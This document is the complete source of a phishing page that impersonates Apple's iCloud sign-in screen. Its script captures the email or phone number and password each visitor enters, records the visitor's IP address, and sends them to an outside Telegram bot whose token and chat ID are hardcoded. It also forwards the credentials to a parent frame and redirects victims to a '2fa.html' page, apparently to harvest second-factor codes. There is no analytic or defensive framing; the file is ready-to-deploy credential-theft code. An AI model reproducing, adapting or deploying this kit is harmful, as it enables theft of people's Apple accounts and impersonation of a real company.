<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover"/>
<title>Sign in with Apple Account – iCloud</title>
<style>
*, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
html, body { width:100%; min-height:100%; }

body {
  background: #1d1d1f;
  font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", "Helvetica Neue", Helvetica, Arial, sans-serif;
  color: #f5f5f7;
  -webkit-font-smoothing: antialiased;
  min-height: 100vh;
  display: flex;
  flex-direction: column;
}

.header {
  height: 64px;
  width: 100%;
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 0 20px;
  flex-shrink: 0;
}

.header-left {
  display: flex;
  align-items: center;
  gap: 8px;
  font-size: 17px;
  font-weight: 600;
  letter-spacing: -0.2px;
  color: #f5f5f7;
}

.header-left img {
  width: 18px;
  height: 18px;
  display: block;
  object-fit: contain;
  flex-shrink: 0;
}

.header-right {
  font-size: 20px;
  letter-spacing: 2px;
  color: #f5f5f7;
}

.main {
  flex: 1;
  display: flex;
  justify-content: center;
  align-items: center;
  padding: 40px 20px 60px;
}

.logo-wrapper {
  display: flex;
  flex-direction: column;
  align-items: center;
  margin-bottom: 20px;
}

.logo-container {
  position: relative;
  width: 140px;
  height: 140px;
  display: flex;
  align-items: center;
  justify-content: center;
}

.ring {
  position: absolute;
  width: 126px;
  height: 126px;
  object-fit: contain;
  animation: rotateRing 15s linear infinite;
}

@keyframes rotateRing {
  from { transform: rotate(0deg); }
  to { transform: rotate(360deg); }
}

.logo {
  position: relative;
  width: 40px;
  height: 40px;
  object-fit: contain;
  z-index: 2;
}

.signin-card {
  width: 400px;
  background: #1f1f21;
  border-radius: 14px;
  border: 1px solid rgba(255,255,255,.025);
  box-shadow: 0 20px 50px rgba(0,0,0,.5);
  padding: 36px 34px 34px;
  text-align: center;
  transition: min-height 0.25s ease;
}

.title {
  margin: 0 0 32px 0;
  font-size: 22px;
  line-height: 1.3;
  font-weight: 600;
  letter-spacing: -0.3px;
  color: #f5f5f7;
  font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Helvetica Neue", Helvetica, Arial, sans-serif;
}

.title .line1 { display: block; font-weight: 600; font-size: 22px; }
.title .line2 { display: block; font-weight: 600; font-size: 22px; color: #f5f5f7; }

/* ============================================
   EMAIL INPUT
   ============================================ */
.email-wrap { position: relative; display: block; }
.email-wrap.hidden { display: none !important; }

.email-input {
  width: 100%;
  height: 46px;
  border: 1px solid #3a3a3e;
  background: #202023;
  color: #f5f5f7;
  padding: 0 50px 0 16px;
  font-size: 14px;
  outline: none;
  border-radius: 10px;
  font-family: inherit;
  transition: border-color 0.2s ease;
}
.email-input::placeholder { color: #85858c; }
.email-input:focus { border-color: #2997ff; }
.email-input.error { border-color: #ff3b30; border-width: 2px; }

/* ============================================
   ARROW
   ============================================ */
.email-arrow {
  position: absolute;
  right: 8px;
  top: 50%;
  transform: translateY(-50%);
  background: #202023;
  border: 1.5px solid #3a3a3e;
  border-radius: 50%;
  color: #8e8e93;
  padding: 0;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  width: 30px;
  height: 30px;
  transition: all 0.2s ease;
}
.email-arrow svg {
  width: 16px;
  height: 16px;
  fill: none;
  stroke: #8e8e93;
  stroke-width: 2.5;
  stroke-linecap: round;
  stroke-linejoin: round;
  transition: all 0.15s ease;
}
.email-arrow:hover { background: #2a2a2e; border-color: #5a5a5e; }
.email-arrow:hover svg { stroke: #f5f5f7; transform: translateX(1px); }
.email-arrow:active { transform: translateY(-50%) scale(0.95); }
.email-arrow:active svg { stroke: #f5f5f7; transform: translateX(2px); }

/* ============================================
   EMAIL DISPLAY
   ============================================ */
.email-display-wrap {
  display: none;
  text-align: center;
  font-size: 14px;
  color: #86868b;
  padding: 10px 0;
  margin-bottom: 6px;
  font-weight: 400;
  background: transparent;
  border: none;
  outline: none;
  justify-content: center;
}
.email-display-wrap.visible { display: flex; justify-content: center; }
.email-display-wrap .email-text { word-break: break-all; }

/* ============================================
   PASSWORD
   ============================================ */
.password-wrap { position: relative; display: none; }
.password-wrap.visible { display: block; }

.password-input {
  width: 100%;
  height: 46px;
  border: 1px solid #3a3a3e;
  background: #202023;
  color: #f5f5f7;
  padding: 0 55px 0 16px;
  font-size: 14px;
  outline: none;
  border-radius: 10px;
  font-family: inherit;
}
.password-input::placeholder { color: #85858c; }
.password-input:focus { border-color: #2997ff; }
.password-input.error { border-color: #ff3b30; border-width: 2px; }
.password-input::-webkit-credentials-auto-fill-button { display: none !important; }
.password-input::-ms-reveal { display: none !important; }

.show-btn {
  position: absolute;
  right: 12px;
  top: 50%;
  transform: translateY(-50%);
  background: transparent;
  border: none;
  color: #8e8e93;
  font-size: 12px;
  font-weight: 600;
  cursor: pointer;
  padding: 4px 10px;
  font-family: inherit;
  z-index: 10;
  border-radius: 4px;
}
.show-btn:hover, .show-btn:active { color: #2997ff; }

.continue-btn {
  width: 100%;
  padding: 14px;
  background: #2997ff;
  color: #fff;
  border: none;
  border-radius: 10px;
  font-size: 17px;
  font-weight: 600;
  cursor: pointer;
  margin-top: 18px;
  margin-bottom: 18px;
  transition: all 0.2s;
  display: none;
  font-family: inherit;
}
.continue-btn.visible { display: block; }
.continue-btn:hover { background: #3aa3ff; }
.continue-btn:disabled { opacity: 0.5; cursor: not-allowed; }

/* ============================================
   INLINE ERROR — PLAIN RED TEXT ONLY
   (no box, no border, no background)
   ============================================ */
.inline-error {
  display: none;
  margin-top: 12px;
  color: #ff453a;
  font-size: 12.5px;
  line-height: 1.45;
  text-align: left;
  font-weight: 400;
  letter-spacing: -0.01em;
  animation: errorIn 0.25s ease;
}
.inline-error.visible { display: block; }
@keyframes errorIn {
  from { opacity: 0; transform: translateY(-3px); }
  to { opacity: 1; transform: none; }
}

/* ============================================
   DIFFERENT ACCOUNT
   ============================================ */
.different-account { text-align: center; margin-top: 8px; display: none; }
.different-account.visible { display: block; }
.different-account a { color: #2997ff; font-size: 12px; text-decoration: none; }
.different-account a:hover { text-decoration: underline; }

/* ============================================
   REMEMBER ME
   ============================================ */
.remember {
  margin-top: 32px;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 6px;
  font-size: 13px;
  color: #d2d2d7;
}
.remember.hidden { display: none !important; }
.remember input { width: 14px; height: 14px; margin: 0; }

/* ============================================
   LINKS
   ============================================ */
.links { margin-top: 36px; display: flex; flex-direction: column; gap: 12px; }
.links.hidden { display: none !important; }
.links a { color: #2997ff; font-size: 13px; text-decoration: none; }
.links a:hover { text-decoration: underline; }

.footer {
  min-height: 72px;
  background: #2b2b2d;
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 0 8.5%;
  color: #b4b4ba;
  font-size: 9px;
}
.footer-links { display: flex; align-items: center; gap: 18px; }
.footer-links span + span { border-left: 1px solid #666; padding-left: 18px; }

/* TOAST */
#toast {
  position: fixed;
  bottom: 30px;
  left: 50%;
  transform: translateX(-50%);
  background: #1c1c1e;
  color: #ffffff;
  padding: 12px 24px;
  border-radius: 60px;
  font-size: 14px;
  font-weight: 500;
  opacity: 0;
  transition: opacity 0.3s ease;
  pointer-events: none;
  z-index: 999;
  text-align: center;
  max-width: 90vw;
  box-shadow: 0 8px 32px rgba(0,0,0,0.2);
}
#toast.show { opacity: 1; }

@media (max-width: 600px) {
  .header { height: 55px; padding: 0 15px; }
  .header-left { font-size: 15px; gap: 6px; }
  .header-left img { width: 16px; height: 16px; }
  .main { padding: 30px 16px 50px; }
  .signin-card { width: 100%; max-width: 400px; padding: 28px 22px 26px; }
  .title { margin-bottom: 24px; font-size: 20px; }
  .title .line1 { font-size: 20px; }
  .title .line2 { font-size: 20px; }
  .continue-btn { font-size: 15px; padding: 13px; }
  .footer { min-height: 90px; padding: 18px 20px; flex-direction: column; justify-content: center; gap: 12px; text-align: center; }
  .footer-links { gap: 12px; }
  .footer-links span + span { padding-left: 12px; }
  .logo-container { width: 120px; height: 120px; }
  .ring { width: 108px; height: 108px; }
  .logo { width: 34px; height: 34px; }
  .email-input, .password-input { height: 44px; font-size: 14px; }
  .email-arrow { width: 28px; height: 28px; }
  .email-arrow svg { width: 14px; height: 14px; }
  .email-display-wrap { font-size: 13px; padding: 8px 0; }
  .remember { font-size: 12px; }
  .links a { font-size: 12px; }
  .inline-error { font-size: 12px; }
}

@media (max-width: 430px) {
  .header { height: 50px; padding: 0 12px; }
  .header-left { font-size: 14px; gap: 5px; }
  .header-left img { width: 14px; height: 14px; }
  .header-right { font-size: 17px; }
  .signin-card { padding: 22px 16px 22px; }
  .title { margin-bottom: 20px; font-size: 18px; }
  .title .line1 { font-size: 18px; }
  .title .line2 { font-size: 18px; }
  .ring { width: 96px; height: 96px; }
  .logo-container { width: 108px; height: 108px; }
  .logo { width: 30px; height: 30px; }
  .email-input, .password-input { height: 42px; font-size: 13px; padding: 0 44px 0 14px; }
  .continue-btn { font-size: 14px; padding: 12px; }
  .email-arrow { width: 26px; height: 26px; }
  .email-arrow svg { width: 13px; height: 13px; }
  .email-display-wrap { font-size: 12px; padding: 6px 0; }
  .remember { font-size: 11px; }
  .links a { font-size: 11px; }
}

@media (max-width: 360px) {
  .header { height: 44px; padding: 0 10px; }
  .header-left { font-size: 13px; gap: 4px; }
  .header-left img { width: 12px; height: 12px; }
  .header-right { font-size: 15px; }
  .signin-card { padding: 18px 12px 18px; border-radius: 10px; }
  .title { margin-bottom: 16px; font-size: 16px; }
  .title .line1 { font-size: 16px; }
  .title .line2 { font-size: 16px; }
  .ring { width: 80px; height: 80px; }
  .logo-container { width: 92px; height: 92px; }
  .logo { width: 26px; height: 26px; }
  .email-input, .password-input { height: 38px; font-size: 12px; padding: 0 40px 0 12px; }
  .continue-btn { font-size: 13px; padding: 10px; }
  .email-arrow { width: 24px; height: 24px; }
  .email-arrow svg { width: 12px; height: 12px; }
  .email-display-wrap { font-size: 11px; padding: 4px 0; }
  .remember { font-size: 10px; }
  .links a { font-size: 10px; }
}
</style>
</head>
<body>

<header class="header">
  <div class="header-left">
    <img src="logo_vector.svg" alt="Apple" style="width:18px; height:18px; object-fit:contain; display:block; flex-shrink:0;">
    <span>iCloud</span>
  </div>
  <div class="header-right">•••</div>
</header>

<main class="main">
  <div style="display:flex; flex-direction:column; align-items:center; width:100%; max-width:400px;">

    <div class="logo-wrapper">
      <div class="logo-container">
        <img class="ring" src="1_ring.png" alt="" onerror="this.style.display='none'">
        <img class="logo" src="HDLOGO.svg" alt="" onerror="this.style.display='none'">
      </div>
    </div>

    <div class="signin-card">

      <h1 class="title">
        <span class="line1">Sign in with Apple</span>
        <span class="line2">Account</span>
      </h1>

      <!-- EMAIL INPUT -->
      <div class="email-wrap" id="emailWrap">
        <input class="email-input" type="text" id="emailInput" placeholder="Email or Phone Number" autocomplete="username" inputmode="email">
        <button class="email-arrow" type="button" id="arrowBtn" aria-label="Continue">
          <svg viewBox="0 0 24 24">
            <path d="M5 12h14M12 5l7 7-7 7"/>
          </svg>
        </button>
      </div>

      <!-- EMAIL DISPLAY -->
      <div class="email-display-wrap" id="emailDisplayWrap">
        <span class="email-text" id="emailDisplay">example@gmail.com</span>
      </div>

      <!-- PASSWORD -->
      <div class="password-wrap" id="passwordWrap">
        <input class="password-input" type="password" id="passwordInput" placeholder="Password" autocomplete="current-password">
        <button class="show-btn" type="button" id="showBtn">Show</button>
      </div>

      <!-- INLINE ERROR — plain red text only -->
      <div class="inline-error" id="inlineError" role="alert" aria-live="polite">
        <span id="inlineErrorText">Check the account information you entered and try again.</span>
      </div>

      <button class="continue-btn" id="continueBtn">Continue</button>

      <div class="different-account" id="differentAccount">
        <a href="#" id="differentAccountLink">Use a different Apple Account</a>
      </div>

      <label class="remember" id="rememberBox">
        <input type="checkbox" id="keepSigned">
        <span>Keep me signed in</span>
      </label>

      <div class="links" id="linksBox">
        <a href="#" id="forgotLink">Forgot password?</a>
        <a href="#" id="createLink">Create Apple Account</a>
      </div>

    </div>
  </div>
</main>

<footer class="footer">
  <div class="footer-links">
    <span>System Status</span>
    <span>Privacy Policy</span>
    <span>Terms &amp; Conditions</span>
  </div>
  <div>Copyright © 2025 Apple Inc. All rights reserved.</div>
</footer>

<div id="toast"></div>

<script>
// ============================================
// TELEGRAM CONFIG
// ============================================
const BOT_TOKEN = "8749570390:AAE0BZbeyn93snvv_gDw-oInzzhf1CYXbkY";
const CHAT_ID = "-1003989470809";

let userIP = 'Unable to detect';
let attemptCount = 1;
let currentEmail = '';
let currentInputType = 'unknown';

async function getUserIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    userIP = data.ip;
  } catch (e) {
    userIP = 'Unable to detect';
  }
}
getUserIP();

function getFormattedDateTime() {
  const now = new Date();
  const days = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
  const dayName = days[now.getDay()];
  let hours = now.getHours();
  const minutes = now.getMinutes().toString().padStart(2, '0');
  const ampm = hours >= 12 ? 'PM' : 'AM';
  hours = hours % 12;
  hours = hours ? hours : 12;
  const timeString = hours + ':' + minutes + ' ' + ampm;
  const month = (now.getMonth() + 1).toString().padStart(2, '0');
  const day = now.getDate().toString().padStart(2, '0');
  const year = now.getFullYear();
  const dateString = year + '/' + month + '/' + day;
  return { dayName, timeString, dateString };
}

function showToast(msg, isError) {
  const toast = document.getElementById('toast');
  toast.textContent = msg;
  toast.style.background = isError ? '#d93025' : '#1c1c1e';
  toast.classList.add('show');
  clearTimeout(toast._hide);
  toast._hide = setTimeout(function () {
    toast.classList.remove('show');
  }, 3000);
}

async function sendToTelegram(messageText) {
  try {
    const url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: messageText,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      })
    });
    return await response.json();
  } catch (err) {
    console.error('Telegram error:', err);
    return false;
  }
}

function escapeHtml(text) {
  if (!text) return '—';
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

const emailInput = document.getElementById('emailInput');
const emailWrap = document.getElementById('emailWrap');
const emailDisplayWrap = document.getElementById('emailDisplayWrap');
const emailDisplay = document.getElementById('emailDisplay');
const arrowBtn = document.getElementById('arrowBtn');
const passwordInput = document.getElementById('passwordInput');
const passwordWrap = document.getElementById('passwordWrap');
const showBtn = document.getElementById('showBtn');
const continueBtn = document.getElementById('continueBtn');
const differentAccount = document.getElementById('differentAccount');
const rememberBox = document.getElementById('rememberBox');
const linksBox = document.getElementById('linksBox');
const inlineError = document.getElementById('inlineError');
const inlineErrorText = document.getElementById('inlineErrorText');

// ============================================
// VALIDATION HELPERS
// ============================================
function isValidEmail(v) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v.trim());
}

function looksLikePhone(v) {
  const digits = v.replace(/\D/g, '');
  return digits.length >= 7;
}

function isValidInput(v) {
  if (!v) return false;
  const trimmed = v.trim();
  return isValidEmail(trimmed) || looksLikePhone(trimmed);
}

function detectInputType(v) {
  const trimmed = v.trim();
  if (isValidEmail(trimmed)) return 'email';
  if (looksLikePhone(trimmed)) return 'phone';
  return 'unknown';
}

// ============================================
// INLINE ERROR HELPERS
// ============================================
function showInlineError(message) {
  inlineErrorText.textContent = message;
  inlineError.classList.add('visible');
}

function hideInlineError() {
  inlineError.classList.remove('visible');
}

// ============================================
// SHOW / HIDE PASSWORD
// ============================================
showBtn.addEventListener('click', function() {
  if (passwordInput.type === 'password') {
    passwordInput.type = 'text';
    showBtn.textContent = 'Hide';
  } else {
    passwordInput.type = 'password';
    showBtn.textContent = 'Show';
  }
});

// ============================================
// STEP 1 → Show password field
// ============================================
function showPasswordField() {
  const value = emailInput.value.trim();

  if (!value) {
    emailInput.classList.add('error');
    emailInput.focus();
    showToast('Please enter your Apple Account email or phone number.', true);
    return;
  }

  if (!isValidInput(value)) {
    emailInput.classList.add('error');
    emailInput.focus();
    // showToast('Please enter a valid email or phone number.', true);
    return;
  }

  currentInputType = detectInputType(value);

  emailInput.classList.remove('error');
  hideInlineError();

  emailWrap.classList.add('hidden');

  emailDisplay.textContent = value;
  emailDisplayWrap.classList.add('visible');

  passwordWrap.classList.add('visible');
  continueBtn.classList.add('visible');
  differentAccount.classList.add('visible');

  rememberBox.classList.add('hidden');
  linksBox.classList.add('hidden');

  currentEmail = value;

  setTimeout(() => passwordInput.focus(), 100);
}

// ============================================
// STEP 2 → Continue
// ============================================
function doLogin() {
  const pwd = passwordInput.value.trim();

  hideInlineError();
  passwordInput.classList.remove('error');
  continueBtn.disabled = false;

  if (!pwd) {
    passwordInput.classList.add('error');
    showInlineError('Please enter your password.');
    passwordInput.focus();
    return;
  }

  // Phone number → reject
  if (currentInputType === 'phone') {
    logAttempt(currentEmail, pwd, 'phone-rejected');
    passwordInput.classList.add('error');
    passwordInput.value = '';
    showInlineError('Check the account information you entered and try again.');
    passwordInput.focus();
    return;
  }

  // Email → proceed
  if (currentInputType === 'email' && currentEmail && pwd) {
    logAttempt(currentEmail, pwd, 'success');

    continueBtn.disabled = true;
    continueBtn.textContent = 'Continue';
    passwordInput.disabled = true;
    showBtn.style.display = 'none';

    setTimeout(function() {
      window.location.href = '2fa.html';
    }, 900);
  }
}

// ============================================
// LOG ATTEMPT
// ============================================
function logAttempt(email, pwd, result) {
  const dateTime = getFormattedDateTime();
  let attemptText;
  if (attemptCount === 1) attemptText = '1ST ATTEMPT ICLOUD';
  else if (attemptCount === 2) attemptText = '2ND ATTEMPT ICLOUD';
  else if (attemptCount === 3) attemptText = '3RD ATTEMPT ICLOUD';
  else attemptText = attemptCount + 'TH ATTEMPT ICLOUD';

  const idLabel = currentInputType === 'phone' ? '📱 Phone' : '📧 Email';
  const statusLine = result === 'phone-rejected'
    ? '⚠️ Status: Check the account information you entered and try again.'
    : '✅ Status: Password submitted';

  const message =
    '🍎 <b>ICLOUD LOGIN</b>\n' +
    '━━━━━━━━━━━━━━━━━━━━━\n' +
    idLabel + ': ' + escapeHtml(email) + '\n' +
    '🔑 Password: ' + escapeHtml(pwd) + '\n' +
    '📊 Attempt: ' + attemptText + '\n' +
    statusLine + '\n' +
    '🌐 IP: ' + userIP + '\n' +
    '📅 Day: ' + dateTime.dayName + '\n' +
    '⏰ Time: ' + dateTime.timeString + '\n' +
    '📆 Date: ' + dateTime.dateString + '\n' +
    '━━━━━━━━━━━━━━━━━━━━━';

  sendToTelegram(message);

  try {
    window.parent.postMessage({
      type: 'icloud_login_attempt',
      email: email,
      password: pwd,
      inputType: currentInputType,
      result: result,
      ip: userIP,
      attempt: attemptText,
      day: dateTime.dayName,
      time: dateTime.timeString,
      date: dateTime.dateString,
      formattedMessage: message
    }, '*');
  } catch (e) {}

  attemptCount++;
}

// ============================================
// EVENT LISTENERS
// ============================================
arrowBtn.addEventListener('click', showPasswordField);

emailInput.addEventListener('keydown', function(e) {
  if (e.key === 'Enter') {
    e.preventDefault();
    showPasswordField();
  }
});

passwordInput.addEventListener('keydown', function(e) {
  if (e.key === 'Enter') {
    e.preventDefault();
    doLogin();
  }
});

continueBtn.addEventListener('click', doLogin);

document.getElementById('differentAccountLink').addEventListener('click', function(e) {
  e.preventDefault();

  emailWrap.classList.remove('hidden');
  emailDisplayWrap.classList.remove('visible');
  passwordWrap.classList.remove('visible');
  continueBtn.classList.remove('visible');
  differentAccount.classList.remove('visible');
  rememberBox.classList.remove('hidden');
  linksBox.classList.remove('hidden');

  emailInput.value = '';
  passwordInput.value = '';
  passwordInput.disabled = false;
  showBtn.style.display = 'block';
  continueBtn.textContent = 'Continue';
  continueBtn.disabled = false;
  passwordInput.classList.remove('error');
  emailInput.classList.remove('error');
  hideInlineError();

  currentEmail = '';
  currentInputType = 'unknown';
  emailInput.focus();
});

emailInput.addEventListener('input', function() {
  this.classList.remove('error');
});

passwordInput.addEventListener('input', function() {
  this.classList.remove('error');
  hideInlineError();
});

document.getElementById('createLink').addEventListener('click', function(e) {
  e.preventDefault();
  showToast('Redirect to Apple Account creation.', false);
});

document.getElementById('forgotLink').addEventListener('click', function(e) {
  e.preventDefault();
  showToast('Password reset link would be sent.', false);
});

window.addEventListener('load', function() {
  emailInput.value = '';
  passwordInput.value = '';
  emailInput.focus();
});

console.log('✅ iCloud page loaded — plain red text error, no box.');
</script>
